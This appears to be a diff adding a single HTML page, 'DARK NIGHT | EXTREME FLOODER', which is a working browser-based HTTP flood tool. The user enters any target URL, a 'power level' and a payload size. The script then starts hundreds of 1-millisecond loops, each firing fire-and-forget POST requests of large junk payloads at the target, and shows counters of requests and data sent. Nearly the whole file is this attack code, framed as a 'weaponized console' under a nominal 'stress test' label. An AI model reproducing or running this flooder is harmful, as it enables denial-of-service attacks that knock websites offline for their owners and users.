@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>DARK NIGHT | EXTREME FLOODER</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #050505; color: #00ff00; }
+        .danger-glow { text-shadow: 0 0 10px #ff0000; color: #ff3333; }
+        .stats-box { border-left: 2px solid #00ff00; padding-left: 10px; }
+    </style>
+</head>
+<body class="p-8 font-mono">
+    <div class="max-w-4xl mx-auto border-2 border-green-900 bg-black p-6 rounded shadow-2xl">
+        <h1 class="text-3xl font-black italic tracking-tighter mb-2 underline">DARK NIGHT | WEAPONIZED CONSOLE</h1>
+        <p class="text-xs text-zinc-500 mb-8 uppercase">Protocol: Stress_Test_v2.1 | Sensor: Disabled</p>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs uppercase text-zinc-400">Target URL (Include http/https)</label>
+                    <input id="target" type="text" value="https://" class="w-full bg-zinc-900 border border-green-800 p-3 mt-1 text-white focus:outline-none focus:ring-1 focus:ring-green-500">
+                </div>
+                
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-xs uppercase text-zinc-400">Power Level (1-500)</label>
+                        <input id="power" type="number" value="200" class="w-full bg-zinc-900 border border-green-800 p-3 text-white focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="block text-xs uppercase text-zinc-400">Payload Size (KB)</label>
+                        <input id="payload" type="number" value="64" class="w-full bg-zinc-900 border border-green-800 p-3 text-white focus:outline-none">
+                    </div>
+                </div>
+
+                <button onclick="ignite()" id="main-btn" class="w-full bg-green-700 hover:bg-green-500 text-black font-bold py-4 transition-all duration-150 uppercase tracking-widest">
+                    Ignite Attack
+                </button>
+            </div>
+
+            <div class="bg-zinc-950 p-4 border border-zinc-800 rounded">
+                <h3 class="text-sm border-b border-zinc-800 pb-2 mb-4">Live Statistics</h3>
+                <div class="space-y-3 text-xs">
+                    <p class="stats-box text-blue-400">Requests Sent: <span id="req-count">0</span></p>
+                    <p class="stats-box text-red-500">Total Data Sent: <span id="data-count">0</span> MB</p>
+                    <p class="stats-box text-yellow-500">Status: <span id="status">STANDBY</span></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-8 bg-black border border-zinc-800 h-48 overflow-y-auto p-4 text-[10px] leading-tight" id="log">
+            <p class="text-zinc-700">[SYSTEM] Initialization complete. No restrictions detected.</p>
+        </div>
+    </div>
+
+    <script>
+        let isAttacking = false;
+        let totalRequests = 0;
+        let totalData = 0;
+        let attackIntervals = [];
+
+        function logMsg(msg, color = "text-zinc-400") {
+            const l = document.getElementById('log');
+            l.innerHTML += `<p class="${color}">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
+            l.scrollTop = l.scrollHeight;
+        }
+
+        function createPayload(sizeKB) {
+            return "X".repeat(sizeKB * 1024);
+        }
+
+        function triggerRequest() {
+            const target = document.getElementById('target').value;
+            const size = parseInt(document.getElementById('payload').value);
+            const payload = createPayload(size);
+            
+            // Menggunakan XMLHttpRequest untuk kontrol lebih rendah dan cepat
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", target + "?id=" + Math.random(), true);
+            xhr.setRequestHeader("Content-Type", "text/plain");
+            
+            // Fire and forget - tidak peduli response
+            xhr.onreadystatechange = function() {}; 
+            xhr.send(payload);
+
+            totalRequests++;
+            totalData += size / 1024;
+            document.getElementById('req-count').innerText = totalRequests;
+            document.getElementById('data-count').innerText = totalData.toFixed(2);
+        }
+
+        function ignite() {
+            const btn = document.getElementById('main-btn');
+            const status = document.getElementById('status');
+            const power = parseInt(document.getElementById('power').value);
+
+            if (!isAttacking) {
+                isAttacking = true;
+                btn.innerText = "CEASE FIRE";
+                btn.className = "w-full bg-red-700 text-white font-bold py-4 uppercase tracking-widest";
+                status.innerText = "ATTACKING";
+                logMsg("CRITICAL: FLOOD SEQUENCE INITIATED", "danger-glow font-bold");
+
+                // Mengaktifkan banyak thread pengiriman secara agresif
+                for (let i = 0; i < power; i++) {
+                    attackIntervals.push(setInterval(triggerRequest, 1));
+                }
+            } else {
+                isAttacking = false;
+                btn.innerText = "Ignite Attack";
+                btn.className = "w-full bg-green-700 hover:bg-green-500 text-black font-bold py-4 transition-all duration-150 uppercase tracking-widest";
+                status.innerText = "STANDBY";
+                attackIntervals.forEach(clearInterval);
+                attackIntervals = [];
+                logMsg("Attack sequence stopped by owner.", "text-blue-500");
+            }
+        }
+    </script>
+</body>
+</html>
